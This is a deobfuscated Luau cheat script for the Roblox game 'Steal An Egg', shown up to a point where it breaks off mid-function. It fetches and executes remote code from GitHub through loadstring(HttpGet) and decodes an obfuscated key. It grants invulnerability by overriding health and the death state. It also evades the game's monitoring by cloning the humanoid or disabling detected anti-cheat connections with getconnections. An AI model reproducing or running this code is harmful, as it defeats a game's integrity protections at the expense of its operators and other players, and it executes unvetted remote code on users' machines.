-- Deobfuscated by ccjvwsod on Discord
-- Detected obfuscation: Luraph v15
-- Local names are inferred from use (the original names are not in the bytecode)

local fn, v, v2, defaultTab, Players, RunService, ReplicatedStorage, CoreGui, UserInputService, localPlayer
local networking, fn2, tbl, v3, fn3, fn4, tbl2, fn5, fn6, tbl3
local tbl4, fn7, n, n2, v4, v5, espSection, tbl5, color, sequence
local palettes, red

do
	local CollectionService, ProximityPromptService, v6, v7, tbl6, tbl7, tbl8

	do
		fn = function(arg)
			local genv = typeof(getgenv) == "function" and getgenv() or _G

			if type(genv.ChilliDebugPrint) == "function" then
				pcall(genv.ChilliDebugPrint, arg)
			end
		end

		task.spawn(pcall, function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink"))()
		end)

		local function fn8()
			local response = nil

			local function fn9()
				if type(response) == "string" and #response > 0 then
					return response
				end
				response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library")
				return response
			end

			local function fn10()
				local chilliHubSaeCleanup = (typeof(getgenv) == "function" and getgenv() or _G).ChilliHubSaeCleanup

				if type(chilliHubSaeCleanup) == "function" then
					pcall(chilliHubSaeCleanup)
				end

				local tbl9 = { game:GetService("CoreGui") }

				if typeof(gethui) == "function" then
					local ok, result = pcall(gethui)

					if ok and typeof(result) == "Instance" then
						table.insert(tbl9, result)
					end
				end

				local tbl10 = {
					Settings = true,
					ChilliLeftCenter = true,
					ChilliLibrarySettings = true,
					ChilliLibraryLauncher = true,
				}

				local n3 = 0

				for _, v8 in ipairs(tbl9) do
					for _, child in ipairs(v8:GetChildren()) do
						if child:IsA("ScreenGui") and (child:GetAttribute("ChilliLibraryOwned") == true or tbl10[child.Name]) then
							pcall(function()
								child:Destroy()
							end)

							n3 += 1
						end
					end
				end

				if n3 > 0 then
					fn("cleared " .. n3 .. " leftover Chilli UI screens")
				end
			end

			local function fn11()
				local v8 = fn9()
				local chunk, v9 = loadstring(v8)
				assert(chunk, v9)
				local v10 = chunk()
				assert(type(v10) == "function", "Chilli Library bootstrap is invalid.")
				local v11 = table.create(45)
				local n3 = 1

				for i = 1, 90, 2 do
					v11[n3] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i, i + 1), 16), string.byte("s9K!2vQ#", (n3 - 1) % 8 + 1)))
					n3 += 1
				end

				return v10(table.concat(v11))
			end

			local chilliLibraryFailedToLoad = "unknown"

			for i = 1, 6 do
				task.wait()
				pcall(fn10)
				local ok, result = pcall(fn11)
				if ok and type(result) == "table" then
					return result
				end
				chilliLibraryFailedToLoad = tostring(result)

				if type(chilliLibraryFailedToLoad) == "string" and string.find(chilliLibraryFailedToLoad, "HttpGet", 1, true) then
					response = nil
				end

				fn("library load attempt " .. i .. " failed: " .. chilliLibraryFailedToLoad)
				task.wait(1 + i * 0.5)
			end

			error("Chilli Library failed to load: " .. chilliLibraryFailedToLoad, 0)
		end

		v = fn8()
		assert(type(v) == "table" and type(v.CreateWindow) == "function" and type(v.Finalize) == "function", "Chilli Library returned an invalid API.")

		v.ManualQuickDefaults = {
			PinnedFeatures = { "Player > Movement > Speed Boost", "Player > Movement > Boost Speed" },
			Keybinds = { ["Player > Movement > Speed Boost"] = "Q" },
			PinGroups = {},
			LeftCenterHidden = true,
		}

		v2 = v:CreateWindow({ Name = "Chilli Hub - Steal An Egg", DefaultTab = "Farm" })
		defaultTab = v2:GetDefaultTab()
		Players = game:GetService("Players")
		RunService = game:GetService("RunService")
		ReplicatedStorage = game:GetService("ReplicatedStorage")
		CoreGui = game:GetService("CoreGui")
		UserInputService = game:GetService("UserInputService")
		CollectionService = game:GetService("CollectionService")
		game:GetService("LocalizationService")
		ProximityPromptService = game:GetService("ProximityPromptService")
		localPlayer = Players.LocalPlayer
		networking = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Networking")

		fn2 = function(arg)
			local ok, result = pcall(function()
				return require(arg())
			end)

			return ok and result or nil
		end

		tbl = {
			EggState = fn2(function()
				return ReplicatedStorage.Client.EggState
			end),
			AreaEggs = fn2(function()
				return ReplicatedStorage.Shared.Types.AreaEggs
			end),
			ToolGameplayGuard = fn2(function()
				return ReplicatedStorage.Client.ToolGameplayGuard
			end),
			Assets = fn2(function()
				return ReplicatedStorage.Data.Assets
			end),
			Guards = fn2(function()
				return ReplicatedStorage.Data.Guards
			end),
			EggRecords = fn2(function()
				return ReplicatedStorage.Shared.Util.EggRecords
			end),
			Mutations = fn2(function()
				return ReplicatedStorage.Shared.Modules.Mutations
			end),
			Save = fn2(function()
				return ReplicatedStorage.Shared.Save
			end),
			FuseKernel = fn2(function()
				return ReplicatedStorage.Shared.Util.FuseKernel
			end),
			AreaEggCycle = fn2(function()
				return ReplicatedStorage.Shared.Util.AreaEggCycle
			end),
			AreaEggResetWall = fn2(function()
				return ReplicatedStorage.Client.AreaEggResetWall
			end),
			AreaEggResetCycle = fn2(function()
				return ReplicatedStorage.Data.AreaEggResetCycle
			end),
			Gears = fn2(function()
				return ReplicatedStorage.Data.Gears
			end),
			Areas = fn2(function()
				return ReplicatedStorage.Data.Areas
			end),
			LimitedEgg = fn2(function()
				return ReplicatedStorage.Data.LimitedEgg
			end),
			BrainrotEgg = fn2(function()
				return ReplicatedStorage.Data.BrainrotEgg
			end),
			MonsterEgg = fn2(function()
				return ReplicatedStorage.Data.MonsterEgg
			end),
		}

		local save = tbl.Save

		if type(save) == "table" and (type(save.Get) ~= "function" or type(save.FieldSignal) ~= "function") then
			tbl.Save = setmetatable({
				Get = type(save.Get) == "function" and save.Get or save.Peek,
				FieldSignal = type(save.FieldSignal) == "function" and save.FieldSignal or save.Watch,
			}, { __index = save })
		end

		local function fn9()
			if typeof(gethui) == "function" then
				local ok, result = pcall(gethui)
				if ok and typeof(result) == "Instance" then
					return result
				end
			end

			return CoreGui
		end

		v3 = fn9()

		do
			local v8 = Random.new()
			local str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

			fn3 = function()
				local v9 = v8:NextInteger(12, 20)
				local v10 = table.create(v9)

				for i = 1, v9 do
					local v11 = v8:NextInteger(1, #str)
					v10[i] = string.sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", v11, v11)
				end

				return table.concat(v10)
			end
		end

		do
			local tbl9 = {}

			fn4 = function(arg)
				table.insert(tbl9, arg)
			end

			tbl2 = {}

			fn5 = function(arg, arg2)
				local n3 = 1000
				local n4 = 3
				local n5 = 12

				local function fn10(arg3)
					if arg3 <= 0 then
						return 0
					end
					local n6 = 10 ^ (math.floor(math.log10(arg3)) - 2)
					return math.floor(arg3 / n6 + 0.5) * n6
				end

				local function fn11(arg3)
					local n6 = math.clamp(tonumber(arg3) or 0, 0, 1000)
					if n6 <= 0 then
						return 0
					end
					return fn10(10 ^ (n4 + (n5 - n4) * n6 / n3))
				end

				local function fn12(arg3)
					local n6 = tonumber(arg3) or 0
					if n6 <= 0 then
						return 0
					end
					local n7 = n5 - n4
					return math.clamp(math.floor((math.log10(n6) - n4) / n7 * n3 * 100 + 0.5) / 100, 0, 1000)
				end

				local function fn13(arg3)
					local str = string.format(arg3 >= 100 and "%.0f" or arg3 >= 10 and "%.1f" or "%.2f", arg3)

					if string.find(str, ".", 1, true) then
						str = string.gsub(string.gsub(str, "0+$", ""), "%.$", "")
					end

					return str
				end

				local function fn14(arg3)
					local v8 = fn11(arg3)
					if v8 <= 0 then
						return "Off"
					end

					if v8 < 1000000 then
						return fn13(v8 / 1000) .. " K/s"
					end

					if v8 < 1e9 then
						return fn13(v8 / 1000000) .. " M/s"
					end
					return fn13(v8 / 1e9) .. " B/s"
				end

				local function fn15(arg3)
					local v8 = fn11(arg3)
					if v8 <= 0 then
						return "0"
					end

					if v8 < 1000000 then
						return fn13(v8 / 1000) .. "k"
					end
					return (string.gsub(string.gsub(string.format("%.3f", v8 / 1000000), "0+$", ""), "%.$", ""))
				end

				local tbl10 = { k = 1000, m = 1000000, b = 1e9, t = 1e12 }

				local function fn16(arg3)
					local v8 = string.gsub(string.lower(string.gsub(tostring(arg3 or ""), "[%s,/]", "")), "s$", "")
					if v8 == "" or v8 == "off" then
						return 0
					end
					local v9, v10 = string.match(v8, "^([%d%.]+)([kmbt]?)$")
					local num = tonumber(v9)
					if not num then
						return nil
					end
					return fn12(num * (tbl10[v10] or 1000000))
				end

				local v8 = arg:CreateSlider({
					Name = arg2.Name,
					Note = arg2.Note,
					SubOf = arg2.SubOf,
					Min = 0,
					Max = n3,
					Default = fn12(arg2.Default or 0),
					AllowDecimals = true,
					Increment = 0.01,
					ValueFormat = fn14,
					ValueParse = fn16,
					Callback = function(arg3)
						if type(arg2.OnRaw) == "function" then
							arg2.OnRaw(fn11(arg3))
						end
					end,
				})

				local value = type(v8) == "table" and rawget(v8, "Instance") or nil

				if typeof(value) == "Instance" then
					for _, descendant in ipairs(value:GetDescendants()) do
						if descendant:IsA("TextBox") then
							local connection = descendant.Focused:Connect(function()
								task.defer(function()
									if descendant:IsFocused() then
										local ok, result = pcall(v8.Get, v8)
										descendant.Text = fn15(ok and result or 0)
										descendant.CursorPosition = #descendant.Text + 1
										descendant.SelectionStart = 1
									end
								end)
							end)

							fn4(function()
								pcall(function()
									connection:Disconnect()
								end)
							end)
						end
					end
				end

				if type(arg2.Legacy) == "string" and type(arg2.SectionName) == "string" then
					table.insert(tbl2, { Handle = v8, Name = arg2.Name, Legacy = arg2.Legacy, Section = arg2.SectionName, StepOf = fn12 })
				end

				return v8
			end

			local text = "All"

			fn6 = function(arg)
				if type(arg) ~= "table" then
					return arg
				end
				local value = rawget(arg, "Instance")
				if typeof(value) ~= "Instance" then
					return arg
				end
				local flag = false

				local function fn10(arg2)
					if flag then
						return
					end

					if arg2.Text == "None" then
						flag = true
						arg2.Text = text
						flag = false
					end
				end

				local function fn11(descendant)
					if not descendant:IsA("TextLabel") or descendant.Name ~= "Value" then
						return
					end
					fn10(descendant)

					local connection = descendant:GetPropertyChangedSignal("Text"):Connect(function()
						fn10(descendant)
					end)

					fn4(function()
						pcall(function()
							connection:Disconnect()
						end)
					end)
				end

				for _, descendant in ipairs(value:GetDescendants()) do
					fn11(descendant)
				end

				local connection = value.DescendantAdded:Connect(fn11)

				fn4(function()
					pcall(function()
						connection:Disconnect()
					end)
				end)

				return arg
			end

			local genv = typeof(getgenv) == "function" and getgenv() or _G
			local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

			if type(chilliHubSaeCleanup) == "function" then
				pcall(chilliHubSaeCleanup)
			end

			genv.ChilliHubSaeCleanup = function()
				for i = #tbl9, 1, -1 do
					pcall(tbl9[i])
				end

				table.clear(tbl9)
			end
		end

		do
			local n3 = 0
			local fn10 = nil

			fn10 = function(arg, arg2)
				local n4 = arg2 or 0

				if type(arg) == "table" then
					if n4 > 3 then
						return
					end
					local n5 = 0

					for k, v8 in pairs(arg) do
						n5 += 1

						if not (n5 > 20) then
							fn10(k, n4 + 1)
							fn10(v8, n4 + 1)
							continue
						end

						break
					end
				elseif typeof(arg) == "Instance" then
					pcall(arg.GetFullName, arg)
				else
					n3 += #tostring(arg)
				end
			end

			local tbl9 = {}

			local function fn11(arg)
				tbl9[#tbl9 + 1] = arg
			end

			local function fn12()
				for _, v8 in ipairs(tbl9) do
					pcall(function()
						v8:Disconnect()
					end)
				end

				table.clear(tbl9)
			end

			local function chilliToolKeeper()
				fn12()

				for _, v8 in ipairs({
					"RE/GearSatchel/Lost",
					"RE/GearSatchel/Gained",
					"RE/RigSync/ProbeSatchel",
					"RE/RigSync/SeedSatchel",
					"RE/RigSync/CorrectionBegan",
					"RE/RigSync/Refresh",
					"RE/ToolTrigger/Trigger",
					"RE/BatSwing/Trigger",
				}) do
					local v9 = networking:FindFirstChild(v8)

					if v9 and v9:IsA("RemoteEvent") then
						fn11(v9.OnClientEvent:Connect(function(...)
							fn10({ ... })
						end))
					end
				end

				local function fn13(arg)
					if not arg then
						return
					end

					fn11(arg.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							fn10({ child.Name, child.Parent })
						end
					end))

					fn11(arg.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							fn10({ child.Name })
						end
					end))
				end

				fn13(localPlayer:FindFirstChildOfClass("Backpack"))

				fn11(localPlayer.ChildAdded:Connect(function(child)
					if child:IsA("Backpack") then
						fn13(child)
					end
				end))

				task.spawn(function()
					pcall(function()
						local v8 = tbl.Save.Get()
						fn10({ v8.GearInventory, v8.Inventory }, 2)
					end)

					if type(getgc) == "function" then
						pcall(function()
							for _, v8 in ipairs(getgc(false)) do
								if type(v8) == "function" and islclosure(v8) then
									pcall(debug.info, v8, "n")
								end
							end
						end)
					end
				end)
			end
			;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper = chilliToolKeeper
			task.defer(chilliToolKeeper)
			fn4(fn12)
		end

		do
			local n3 = 0.35
			local n4 = 5
			local tbl9 = {}
			local flag = true

			tbl3 = {
				Add = function(arg)
					local tbl10 = { Run = arg, Gap = n3, Idle = n4, Repeat = false, Hold = 0 }
					table.insert(tbl9, tbl10)
					return tbl10
				end,
				Wake = function()
					flag = true
				end,
				Backoff = function(arg, arg2)
					if arg then
						arg.Hold = tonumber(arg2) or 6
					end
				end,
			}

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				local v8 = flag
				flag = false

				for _, v9 in ipairs(tbl9) do
					v9.Gap = v9.Gap + deltaTime
					v9.Idle = v9.Idle + deltaTime

					if v9.Hold > 0 then
						v9.Hold = v9.Hold - deltaTime
					elseif v9.Gap >= n3 and (v8 or v9.Repeat or v9.Idle >= n4) then
						v9.Gap = 0
						v9.Idle = 0
						local ok, result = pcall(v9.Run, v9)
						v9.Repeat = ok and result == true
					end
				end
			end)

			fn4(function()
				connection:Disconnect()
			end)
		end

		v6 = defaultTab:CreateSection({ Name = "Dr Scramble Event", Expanded = false })
		local v8
		v8 = defaultTab:CreateSection({ Name = "Auto Steal", Expanded = true })
		local v9
		v9 = defaultTab:CreateSection({ Name = "Auto Place Egg", Expanded = false })
		local v10
		v10 = defaultTab:CreateSection({ Name = "Auto Treadmill", Expanded = false })
		local v11
		v11 = defaultTab:CreateSection({ Name = "Auto Hatch & Equip", Expanded = false })
		local v12
		v12 = defaultTab:CreateSection({ Name = "Auto Sell", Expanded = false })
		local v13
		v13 = defaultTab:CreateSection({ Name = "Auto Fuse Machine", Expanded = false })
		local v14
		v14 = defaultTab:CreateSection({ Name = "Auto Favorite", Expanded = false })
		v7 = defaultTab:CreateSection({ Name = "Auto Rift & Boss", Expanded = false })
		tbl6 = { Paused = false }

		do
			local n3 = 0.5
			local v15 = nil
			local tbl9 = nil
			local tbl10 = {}
			local flag = false
			local n4 = 0

			local function fn10()
				for i = #tbl10, 1, -1 do
					local v16 = tbl10[i]

					if v16 and v16.Connected then
						v16:Disconnect()
					end

					tbl10[i] = nil
				end
			end

			local function fn11()
				fn10()
				local v16 = v15
				local v17 = tbl9
				v15 = nil
				tbl9 = nil
				if not v16 or not v16.Parent or not v17 then
					return
				end

				pcall(function()
					v16.BreakJointsOnDeath = v17.BreakJointsOnDeath
					v16.RequiresNeck = v17.RequiresNeck
					v16:SetStateEnabled(Enum.HumanoidStateType.Dead, v17.DeadEnabled)
				end)
			end

			local function fn12(arg)
				if not arg or not arg.Parent then
					return false
				end

				return pcall(function()
					arg.BreakJointsOnDeath = false
					arg.RequiresNeck = false
					arg:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
				end) and arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
			end

			local function fn13(arg)
				if tbl6.Paused or arg ~= v15 or not arg or not arg.Parent or flag then
					return false
				end
				local maxHealth = arg.MaxHealth
				if maxHealth <= 0 then
					return false
				end

				if maxHealth == math.huge or arg.Health >= maxHealth then
					return true
				end
				flag = true

				local ok = pcall(function()
					arg.Health = maxHealth
				end)

				flag = false
				return ok and arg.Health >= maxHealth
			end

			local function fn14(arg)
				if arg == v15 and arg and arg.Parent then
					return true
				end
				fn11()
				if not arg or not arg:IsA("Humanoid") or not arg.Parent then
					return false
				end
				v15 = arg

				tbl9 = {
					BreakJointsOnDeath = arg.BreakJointsOnDeath,
					RequiresNeck = arg.RequiresNeck,
					DeadEnabled = arg:GetStateEnabled(Enum.HumanoidStateType.Dead),
				}

				if not fn12(arg) then
					fn11()
					return false
				end
				fn13(arg)

				tbl10[#tbl10 + 1] = arg.HealthChanged:Connect(function()
					fn13(arg)
				end)

				tbl10[#tbl10 + 1] = arg:GetPropertyChangedSignal("MaxHealth"):Connect(function()
					fn13(arg)
				end)

				tbl10[#tbl10 + 1] = arg.StateChanged:Connect(function(old, new)
					if new == Enum.HumanoidStateType.Dead and not tbl6.Paused then
						fn12(arg)
						fn13(arg)
					end
				end)

				n4 = os.clock()
				return true
			end

			local function fn15()
				local character = localPlayer.Character
				return character and character:FindFirstChildOfClass("Humanoid") or nil
			end

			local connection = localPlayer.CharacterAdded:Connect(function()
				task.defer(function()
					fn14(fn15())
				end)
			end)

			local connection2 = RunService.Heartbeat:Connect(function()
				local now = os.clock()
				if tbl6.Paused or now - n4 < n3 then
					return
				end
				n4 = now
				local v16 = fn15()
				if v16 ~= v15 then
					fn14(v16)
					return
				end

				if v16 then
					fn12(v16)
					fn13(v16)
				end
			end)

			task.defer(function()
				fn14(fn15())
			end)

			fn4(function()
				if connection then
					connection:Disconnect()
				end

				if connection2 then
					connection2:Disconnect()
				end

				fn11()
			end)
		end

		local tbl9 = { "bat", "katana", "axe", "staff", "club", "hammer", "sword", "blade" }

		tbl4 = {
			Steal = { Active = false, LastFinishedAt = 0, Carrying = false },
			Movement = {
				Owner = nil,
				PlaceWanted = false,
				StealFirst = false,
				MutationWanted = false,
				FracturedWanted = false,
			},
			AntiGuard = {
				Enabled = false,
				Busy = false,
				BusySince = 0,
				HitArms = 0,
				Handle = nil,
				Render = nil,
			},
			IsBatTool = function(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end

				if arg:GetAttribute("IsBat") == true then
					return true
				end
				local attribute = arg:GetAttribute("GearName")

				if type(attribute) == "string" then
					local gears = tbl.Gears
					local directory = type(gears) == "table" and gears.Directory or nil
					local flag = type(directory) == "table" and directory[attribute] or nil
					return type(flag) == "table" and flag.BatControllerData ~= nil
				end

				if arg:GetAttribute("ItemType") ~= nil then
					return false
				end
				local v15 = string.lower(arg.Name)

				for _, v16 in ipairs(tbl9) do
					if string.find(v15, v16, 1, true) then
						return true
					end
				end

				return false
			end,
			FindBat = function()
				local character = localPlayer.Character
				local tool = character and character:FindFirstChildWhichIsA("Tool")
				if tbl4.IsBatTool(tool) then
					return tool
				end
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")

				if backpack then
					for _, child in ipairs(backpack:GetChildren()) do
						if tbl4.IsBatTool(child) then
							return child
						end
					end
				end

				if character then
					for _, child in ipairs(character:GetChildren()) do
						if tbl4.IsBatTool(child) then
							return child
						end
					end
				end

				return nil
			end,
			IsNight = function()
				local areaEggCycle = tbl.AreaEggCycle
				if type(areaEggCycle) ~= "table" or type(areaEggCycle.IsNightPhase) ~= "function" then
					return false
				end
				local ok, result = pcall(areaEggCycle.IsNightPhase, workspace:GetServerTimeNow())
				return ok and result == true
			end,
			WallSealed = function()
				local areaEggResetWall = tbl.AreaEggResetWall
				if type(areaEggResetWall) ~= "table" or type(areaEggResetWall.IsSealed) ~= "function" then
					return false
				end
				local ok, result = pcall(areaEggResetWall.IsSealed)
				return ok and result == true
			end,
			WallOpenDelay = function()
				local areaEggResetCycle = tbl.AreaEggResetCycle
				if type(areaEggResetCycle) ~= "table" then
					return 5
				end
				return (tonumber(areaEggResetCycle.WallCountdownDelayAfterDayStartsSeconds) or 2) + (tonumber(areaEggResetCycle.WallCountdownSeconds) or 3)
			end,
			ClaimMovement = function(owner)
				local movement = tbl4.Movement
				if movement.Owner == nil or movement.Owner == owner or movement.Owner == "treadmill" and owner ~= "treadmill" or movement.Owner == "scramble" and owner == "steal" then
					movement.Owner = owner
					return true
				end
				return false
			end,
			ReleaseMovement = function(arg)
				if tbl4.Movement.Owner == arg then
					tbl4.Movement.Owner = nil
				end
			end,
		}

		do
			local shieldMethods = { "Humanoid Swap", "Disable Monitor" }
			tbl4.ShieldMethods = shieldMethods
			local v15 = shieldMethods[1]
			local tbl10 = {}
			local tbl11 = {}
			local connection = nil
			local n3 = 0
			local tbl12 = { Original = nil, Clone = nil, Links = {} }
			local connection2 = nil
			local tbl13 = {}

			local function fn10()
				for _, v16 in ipairs(tbl13) do
					task.defer(function()
						pcall(v16)
					end)
				end
			end

			tbl4.OnHumanoidChanged = function(arg)
				table.insert(tbl13, arg)
				local tbl14

				tbl14 = {
					Connected = true,
					Disconnect = function()
						tbl14.Connected = false
						local v16 = table.find(tbl13, arg)

						if v16 then
							table.remove(tbl13, v16)
						end
					end,
				}

				return tbl14
			end

			local function fn11(humanoid)
				pcall(function()
					local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
					playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")

					if playerScripts then
						local controls = require(playerScripts):GetControls()

						if type(controls) == "table" then
							controls.humanoid = humanoid
						end
					end
				end)
			end

			local function fn12(arg)
				local animate = arg and arg:FindFirstChild("Animate")

				if animate and animate:IsA("LocalScript") then
					task.spawn(function()
						animate.Enabled = false
						task.wait()
						animate.Enabled = true
					end)
				end
			end

			local function fn13()
				for _, link in ipairs(tbl12.Links) do
					pcall(function()
						link:Disconnect()
					end)
				end

				table.clear(tbl12.Links)
			end

			tbl4.UndoSwap = function()
				fn13()
				local character = localPlayer.Character
				local original = tbl12.Original
				local clone = tbl12.Clone
				local v16 = tbl12
				tbl12.Original = nil
				v16.Clone = nil

				if original and clone and character and original.Parent == nil and clone.Parent == character then
					original.Parent = character
					workspace.CurrentCamera.CameraSubject = original
					fn11(original)

					pcall(function()
						clone:Destroy()
					end)

					fn12(character)
					fn10()
				end
			end

			local tbl14 = {
				[Enum.HumanoidStateType.Running] = true,
				[Enum.HumanoidStateType.RunningNoPhysics] = true,
				[Enum.HumanoidStateType.Landed] = true,
			}

			tbl4.Grounded = function(arg)
				if not arg then
					arg = localPlayer.Character
					arg = arg and arg:FindFirstChildOfClass("Humanoid")
				end

				if not arg or arg.Health <= 0 or arg.FloorMaterial == Enum.Material.Air then
					return false
				end
				return tbl14[arg:GetState()] == true
			end

			tbl4.ShieldPaused = false

			local function fn14()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoid or humanoid.Health <= 0 then
					return
				end

				if tbl12.Clone and tbl12.Clone.Parent == character then
					return
				end

				if not tbl4.Grounded(humanoid) then
					return
				end
				local clone = humanoid:Clone()
				humanoid.Parent = nil
				clone.Parent = character
				workspace.CurrentCamera.CameraSubject = clone
				fn11(clone)
				fn12(character)
				local v16 = tbl12
				tbl12.Original = humanoid
				v16.Clone = clone
				fn10()
				local animator = humanoid:FindFirstChildOfClass("Animator")
				local animator2 = clone:FindFirstChildOfClass("Animator")

				if animator and animator2 then
					table.insert(tbl12.Links, animator.AnimationPlayed:Connect(function(arg)
						local animation = arg.Animation
						if not animation or clone.Parent == nil then
							return
						end

						local ok, result = pcall(function()
							return animator2:LoadAnimation(animation)
						end)

						if not ok or not result then
							return
						end

						pcall(function()
							result.Priority = arg.Priority
							result.Looped = arg.Looped
							local speed = arg.Speed
							result:Play(0.05, math.max(arg.WeightTarget, 0.01), speed)
						end)

						local connection3 = nil

						connection3 = arg.Stopped:Connect(function()
							connection3:Disconnect()

							pcall(function()
								result:Stop(0.1)
							end)
						end)
					end))
				end

				table.insert(tbl12.Links, clone.Died:Connect(function()
					fn13()
					local v17 = tbl12
					tbl12.Original = nil
					v17.Clone = nil
					local character2 = localPlayer.Character

					if character2 and humanoid.Parent == nil then
						humanoid.Parent = character2
						workspace.CurrentCamera.CameraSubject = humanoid
						fn11(humanoid)
						fn10()
					end

					pcall(function()
						clone:Destroy()
					end)

					humanoid.Health = 0
				end))
			end

			local function fn15()
				if type(getconnections) ~= "function" then
					return
				end

				for _, v16 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
					local ok, result = pcall(getconnections, v16)

					if ok and type(result) == "table" then
						for _, v17 in ipairs(result) do
							local ok2, result2 = pcall(function()
								return v17.Function
							end)

							ok2 = ok2 and type(result2) == "function"
							local flag = false
							local result3 = nil

							if ok2 then
								flag, result3 = pcall(debug.info, result2, "s")
							end

							if flag and string.find(tostring(result3), "UGI", 1, true) then
								local ok3, result4 = pcall(function()
									return v17.Enabled
								end)

								if not ok3 or result4 ~= false then
									if pcall(function()
										v17:Disable()
									end) then
										table.insert(tbl11, v17)
									end
								end
							end
						end
					end
				end
			end

			local function fn16()
				if connection then
					connection:Disconnect()
					connection = nil
				end

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end

				for _, v16 in ipairs(tbl11) do
					pcall(function()
						v16:Enable()
					end)
				end

				table.clear(tbl11)
			end

			local function fn17()
				if tbl4.ShieldPaused then
					return
				end

				if v15 == shieldMethods[1] then
					fn14()
				else
					fn15()
				end
			end

			local function fn18()
				fn17()
				n3 = 0

				connection = RunService.Heartbeat:Connect(function(deltaTime)
					n3 += deltaTime
					local character = localPlayer.Character
					local flag = v15 == shieldMethods[1]

					if flag then
						flag = not (tbl12.Clone and character and tbl12.Clone.Parent == character)
					end

					if (flag and 0.25 or 3) <= n3 then
						n3 = 0
						fn17()
					end
				end)

				connection2 = localPlayer.CharacterAdded:Connect(function(character)
					fn13()
					local v16 = tbl12
					tbl12.Original = nil
					v16.Clone = nil
					if v15 ~= shieldMethods[1] then
						return
					end

					task.spawn(function()
						character:WaitForChild("Humanoid", 10)
						task.wait(1)

						if connection and localPlayer.Character == character then
							fn17()
						end
					end)
				end)
			end

			tbl4.Swapped = function()
				if v15 ~= shieldMethods[1] then
					return true
				end
				local character = localPlayer.Character
				return tbl12.Clone ~= nil and character ~= nil and tbl12.Clone.Parent == character
			end

			tbl4.Shield = function(arg, arg2)
				tbl10[arg] = arg2 == true or nil
				if next(tbl10) == nil then
					fn16()
					return
				end

				if connection then
					return
				end
				fn18()
			end

			tbl4.SetShieldMethod = function(arg)
				if not table.find(shieldMethods, arg) or arg == v15 then
					return
				end
				local flag = connection ~= nil
				fn16()
				v15 = arg

				if flag and next(tbl10) ~= nil then
					fn18()
				end
			end

			fn4(fn16)
		end

		tbl4.Shield("load", true)

		tbl4.Toggle = function(arg, arg2)
			if type(arg) ~= "table" then
				return arg2 == true
			end

			local ok, result = pcall(function()
				local controller = arg._controller
				return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
			end)

			if ok and type(result) == "boolean" then
				return result
			end

			for _, v15 in ipairs({ "Get", "GetValue" }) do
				local ok2, result2 = pcall(function()
					return arg[v15]
				end)

				if ok2 and type(result2) == "function" then
					local ok3, result3 = pcall(result2, arg)
					if ok3 and type(result3) == "boolean" then
						return result3
					end
				end
			end

			return arg2 == true
		end

		tbl4.Root = function()
			local character = localPlayer.Character
			character = character and character:FindFirstChild("HumanoidRootPart")
			return character and character:IsDescendantOf(workspace) and character or nil
		end

		tbl4.PlacedPoints = function()
			local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
			local tbl10 = {}
			if not placedEggRenders then
				return tbl10
			end
			local str = tostring(localPlayer.UserId)

			for _, child in ipairs(placedEggRenders:GetChildren()) do
				if string.find(child.Name, str, 1, true) then
					local ok, result = pcall(function()
						return child:IsA("Model") and child:GetPivot() or child.CFrame
					end)

					if ok then
						table.insert(tbl10, result.Position)
					end
				end
			end

			return tbl10
		end

		tbl4.OwnPlot = function()
			local plots = workspace:FindFirstChild("Plots")
			if not plots then
				return nil
			end

			for _, child in ipairs(plots:GetChildren()) do
				local plotSign = child:FindFirstChild("PlotSign")
				plotSign = plotSign and plotSign:FindFirstChild("PlayerPlotSign")
				plotSign = plotSign and plotSign:FindFirstChild("Frame")
				plotSign = plotSign and plotSign:FindFirstChild("PlayerName")

				if plotSign and plotSign:IsA("TextLabel") then
					local v15 = string.lower(plotSign.Text)
					if v15 == string.lower(localPlayer.Name) or v15 == string.lower(localPlayer.DisplayName) then
						return child
					end
				end
			end

			return nil
		end

		local function fn10()
			local v15 = tbl4.PlacedPoints()
			if #v15 == 0 then
				return nil
			end
			local vector = Vector3.zero

			for _, v16 in ipairs(v15) do
				vector += v16
			end

			return vector / #v15
		end

		tbl4.PenAnchor = function()
			local v15 = fn10()
			if v15 then
				return v15
			end
			local v16 = tbl4.OwnPlot()
			if not v16 then
				return nil
			end
			local toUpdate = v16:FindFirstChild("ToUpdate")
			local starterPen = toUpdate and toUpdate:FindFirstChild("StarterPen") or v16:FindFirstChild("CenterPoint")
			if not starterPen then
				return nil
			end

			local ok, result = pcall(function()
				return starterPen:IsA("Model") and starterPen:GetPivot() or starterPen.CFrame
			end)

			return ok and result.Position or nil
		end

		tbl4.Plot = function()
			local v15 = tbl4.OwnPlot()
			if v15 then
				return v15
			end
			local plots = workspace:FindFirstChild("Plots")
			local v16 = fn10()
			if not plots or not v16 then
				return nil
			end
			local huge = math.huge
			local v17 = nil

			for _, child in ipairs(plots:GetChildren()) do
				local ok, result, result2 = pcall(function()
					return child:GetBoundingBox()
				end)

				if ok and result and result2 then
					local v18 = result:PointToObjectSpace(v16)
					local n3 = result2.X / 2
					local flag = math.abs(v18.X) <= n3
					local flag2

					if flag then
						local n4 = result2.Z / 2
